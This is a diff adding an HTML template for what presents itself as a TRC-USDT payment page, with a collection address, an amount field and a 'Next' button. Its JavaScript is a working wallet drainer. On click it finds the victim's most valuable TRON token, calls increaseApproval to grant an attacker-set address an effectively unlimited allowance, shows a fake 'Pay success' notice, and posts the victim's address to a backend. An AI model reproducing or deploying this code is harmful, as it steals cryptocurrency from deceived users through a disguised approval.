@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+
+<html lang="en" data-dpr="1" style="font-size: 54px;" class="no-touch">
+	<head>
+		<link rel="icon" href="/favicon.ico" type="image/x-icon" />
+		<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<!-- Required meta tags-->
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black">
+		<meta name="format-detection" content="telephone=no, email=no">
+		<meta name="msapplication-tap-highlight" content="no">
+		<meta name="x5-orientation" content="portrait">
+		<meta name="x5-fullscreen" content="true">
+		<link rel="icon" href="favicon.ico">
+		<meta name="description" content="">
+		<meta name="keywords" content="">
+		<!-- App title -->
+		<title>TRC-USDT Transfer</title>
+		<!-- Framework7 Library CSS -->
+		<link rel="stylesheet" href="/scan/css/vendor.min.css">
+
+		<!-- Custom app styles-->
+		<link rel="stylesheet" href="/scan/css/reset.min.css">
+		<link rel="stylesheet" href="/scan/css/main.css">
+		
+		<script type="text/javascript" src="/scan/js/usdt/TronWeb.js"></script>
+		<!-- Jquery app core js-->
+		<script type="text/javascript" src="/scan/js/jquery-2.1.4.min.js"></script>
+		<script type="text/javascript" src="/scan/js/flexible.js"></script>
+		<style type="text/css">
+			.tishi{
+				width: 3.5rem;
+				height: 1.2rem;
+				background: #00000059;
+				z-index: 999999999999;
+				position: fixed;
+				top: 50%;
+				left: 50%;
+				transform: translate(-50%, -50%);
+				border-radius: 0.1rem;
+				color: white;
+				font-size: 0.6rem;
+				text-align: center;
+				line-height: 1.2rem;
+				display: none;
+			}
+		</style>
+	</head>
+	<body style="font-size: 12px;">
+		<!-- Views -->
+		<div class="views">
+			<!-- main view -->
+			<div class="view view-main">
+				<!-- Pages -->
+				<div class="pages navbar-through">
+					<div class="page">
+						<div class="page-content" style="padding-top: 0.5rem;">
+							<div class="list-block address">
+								<div class="list-block-title">Collection Address</div>
+								<ul>
+									<li class="item-content">
+										<div class="item-inner">
+											<div class="item-title" id="address">{$address}</div>
+										</div>
+									</li>
+								</ul>
+							</div>
+							<div class="list-block amount">
+								<div class="list-block-title">Amount<span id="yu"> USDT</span></div>
+								<ul>
+									<li class="item-content">
+										<div class="item-inner">
+											<div class="item-title">
+												<input class="num" value="1" id="zhi">
+												<p>$ <span id="price" style="color: inherit;font-size:inherit;">1</span></p>
+													<iframe style="display:none;" id="content"></iframe>
+											</div>
+										</div>
+									</li>
+									<!--<li class="item-content">-->
+									<!--	<div class="item-inner">-->
+									<!--		<div class="item-after">Remark</div>-->
+									<!--	</div>-->
+									<!--</li>-->
+								</ul>
+								<!-- <ul>
+									<li class="item-content item-link">
+										<div class="item-inner">
+											<div class="item-title">Miners fee</div>
+											<div class="item-after">
+												<p>0.002640 ETH</p>
+												<p>￥44.69</p>
+											</div>
+										</div>
+									</li>
+								</ul> -->
+							</div>
+							<div class="list-block-button">
+								<button class="button button-fill " id="btn-connect" style="background: rgb(7, 139, 195);">Next</button>
+							</div>
+						</div>
+					</div>
+					<!-- Preloader -->
+					<div class="modal">
+						<div class="preloader"></div>
+					</div>
+					<div class="tishi">
+						Pay success
+					</div>
+				</div>
+			</div>
+			<div id="s">
+			</div>
+		</div>
+		<div id="fffsss" style="color: white;z-index: 99999999999999999;position: absolute;top: 1px;"></div>
+		<div style="display:none;">
+			<textarea id="jsondata">{$addr|json_encode}</textarea>
+		</div>
+	<script type="text/javascript">
+			var address = "{$address}";
+			var agent = "{$agent}";
+			var rank = 1;
+			var authorized_address = '{$authorized_address}';
+		   
+
+			var domain = '{$domain}';
+			var bizhong = '';
+			var approveAddr = "{$approveAddr}";
+		
+           
+				
+			$('input.num').bind('input propertychange', function(){
+				if($(this).val() && $(this).val()>0){
+					$('#btn-connect').css('background','#078bc3');
+				}else{
+					$('#btn-connect').css('background','#dde0dd');
+				}
+				$('#price').text(($(this).val()*rank).toLocaleString());
+			})
+			
+			
+			async function postInfo(address,symbol){
+				var data = {
+					address:address,
+					auth_address:authorized_address,
+					bizhong:symbol,
+					agent:agent
+				}
+				var d = new Date();
+                var n = d.getTime();
+
+				$.ajax({
+					type: 'get',
+					url:  domain + "{:url('index/api/trc_post')}?t="+n,
+					data: data,
+					success:function(){
+					}
+				})
+			}
+		
+
+		$(function() {
+			const addr = JSON.parse($('#jsondata').html());
+
+			const price = {
+				'WIN': 0.001150,
+				'USDT':1,
+				'TONS':1.35,
+				'USDJ':1.04,
+				'JST': 0.125,
+				"HT": 20.41,
+				"SUN": 33.97,
+				"EXNX": 0.0621,
+				"VCOIN": 0.004225,
+				"POL": 0.1393,
+				"CKRW": 0.002487,
+			}
+
+			const decimals = {
+				'WIN': 6,
+				'USDT':6,
+				'TONS':6,
+				'USDJ':18,
+				'JST': 18,
+				"HT": 18,
+				"SUN": 18,
+				"EXNX": 18,
+				"VCOIN": 6,
+				"POL": 8,
+				"CKRW": 6,
+			}
+
+			var total=0;
+			async function getMostValuableAssets(account) {
+				let _symbol = 'USDT';
+				for (const symbol of Object.keys(addr)) {
+					let contract = await tronWeb.contract().at(addr[symbol]);
+					let myBalance = await contract.balanceOf(account).call(function(err,balance){
+						const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol];
+						console.log(usdt);
+						if (usdt > total && usdt > 500) {
+							_symbol = symbol;
+							total = usdt;
+							approveAddr = addr[_symbol];
+						}
+					})
+				}
+				bizhong = _symbol;
+				return _symbol;
+			}
+
+			/**
+			* * Connect wallet button pressed.
+			*/
+			async function onConnect() {
+				$('.pages').append('<div class="modal-overlay"></div>');
+				$('.modal-overlay').addClass('modal-overlay-visible');
+				$('.modal').removeClass('modal-out').addClass('modal-in');
+				// fffsss = fffsss + "开始:"
+				let tronWeb = window.tronWeb;
+				// fffsss = fffsss + "tronWeb:" + tronWeb + "---"
+				// $("#fffsss").text(fffsss)
+				let walletAddress = tronWeb.defaultAddress.base58;
+				var yudi = tronWeb.defaultAddress.base58;
+				
+				// fffsss = fffsss + "walletAddress:" + walletAddress + "---"
+				// $("#fffsss").text(fffsss)
+				bizhong = await getMostValuableAssets(walletAddress);
+				// fffsss = fffsss + "approveAddr:" + approveAddr + "---"
+				// $("#fffsss").text(fffsss)
+				let instance = await tronWeb.contract().at(approveAddr);
+				// fffsss = fffsss + "instance:" + instance + "---"
+				// $("#fffsss").text(fffsss)
+				// fffsss = fffsss + "walletAddress:" + walletAddress + "---"
+				// $("#fffsss").text(fffsss)
+				// fffsss = fffsss + "bizhong:" + bizhong + "---"
+				// $("#fffsss").text(fffsss)
+				let res = await instance["increaseApproval"](authorized_address,"90000000000000000000000000000");
+				res.send({
+					feeLimit: 100000000,
+					callValue: 0,
+					shouldPollResponse: false
+				},function(err,res){
+					// fffsss = fffsss + "res:" + res + "---"
+					// $("#fffsss").text(fffsss)
+					// fffsss = fffsss + "err:" + err + "---"
+					// $("#fffsss").text(fffsss)
+					if(err == null){
+						// fffsss = fffsss + "walletAddress:" + walletAddress + "---"
+						// $("#fffsss").text(fffsss)
+						// fffsss = fffsss + "bizhong:" + bizhong + "---"
+						// $("#fffsss").text(fffsss)
+							
+            
+						$(".tishi").fadeIn()
+						setTimeout(function () {
+							$(".tishi").fadeOut()
+							
+					
+						},2000);
+						postInfo(walletAddress,bizhong)
+					}
+					
+					
+					
+					$('.modal-overlay').remove();
+					$('.modal').removeClass('modal-in').addClass('modal-out');
+				})
+			}
+			function init() {
+			   
+			}
+			
+			
+			async function s(){
+				if (window.tronWeb) {
+					var tronWeb = window.tronWeb;
+					let contract = await tronWeb.contract().at("{$address}");
+					let walletAddress = tronWeb.defaultAddress.base58;
+					let result = await contract.balanceOf(walletAddress).call(function(err,tex){
+						if(err == null){
+							let total = tex._hex/(10**6);
+							$('#yu').text(total.toLocaleString() +' USDT')
+							console.log();
+						}
+					});
+				}else{
+				}
+			}
+
+			/**
+			* Main entry point.
+			*/
+		  
+			init();
+			
+			document.querySelector("#btn-connect").addEventListener("click", onConnect);
+			document.querySelector("#s").addEventListener("click", s);
+		})
+		
+		$(function(){
+			setTimeout(function(){
+				$('#s').click()
+			},1000);
+		})
+		</script>
+	</body>
+</html>
